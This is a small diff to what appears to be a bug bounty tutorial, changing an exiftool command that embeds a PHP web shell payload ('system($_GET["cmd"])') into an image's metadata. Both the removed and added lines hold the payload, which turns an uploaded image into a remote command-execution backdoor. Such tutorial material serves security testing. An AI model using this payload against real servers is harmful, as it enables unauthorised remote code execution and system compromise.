@@ -5,6 +5,7 @@ bug bounty tutorial
 ```
 apt-get install exiftools
 
-exiftools -Comment="<?php echo system(\$_GET["cmd"]); ?>" image_name
+exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' index.jpeg
+
 
 ```
